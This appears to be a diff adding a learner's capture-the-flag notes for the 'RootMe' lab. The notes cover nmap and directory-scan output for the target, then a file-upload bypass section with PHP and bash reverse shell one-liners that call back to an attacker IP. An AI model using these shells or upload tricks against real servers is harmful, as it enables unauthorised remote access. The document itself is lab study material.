@@ -1,0 +1,37 @@
+ROOTME 
+
+export ip='10.10.151.108'
+
+
+RECONAISSANCE
+nmap -sCV 10.10.151.108 > nmapscan.txt
+ 			>>> nmapscan.txt 
+ 			
+Hidden directories
+	dirsearch 
+		dirsearch -u http://10.10.151.108/ 
+			[04:44:45] 301 -  312B  - /css  ->  http://10.10.151.108/css/               
+			[04:45:05] 200 -  616B  - /index.php                                        
+			[04:45:06] 200 -  616B  - /index.php/login/                                 
+			[04:45:09] 200 -  959B  - /js/                                              
+			[04:45:27] 301 -  314B  - /panel  ->  http://10.10.151.108/panel/           
+			[04:45:27] 200 -  732B  - /panel/                                           
+			[04:45:45] 403 -  278B  - /server-status                                    
+			[04:45:45] 403 -  278B  - /server-status/                                   
+			[04:46:02] 200 -  744B  - /uploads/                                         
+			[04:46:02] 301 -  316B  - /uploads  ->  http://10.10.151.108/uploads/       
+	gobuster
+		gobuster dir -u http://10.10.151.108/ -w /usr/share/wordlist/dirbuster/directorylist-2.3-medium.txt
+		
+GETTING A SHELL 
+
+bypassing file upload and reverse shell
+
+using php reverse shell
+	php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
+	
+	
+	source file upload : https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/<img src="webshell.php.gif" alt="" />
+
+	
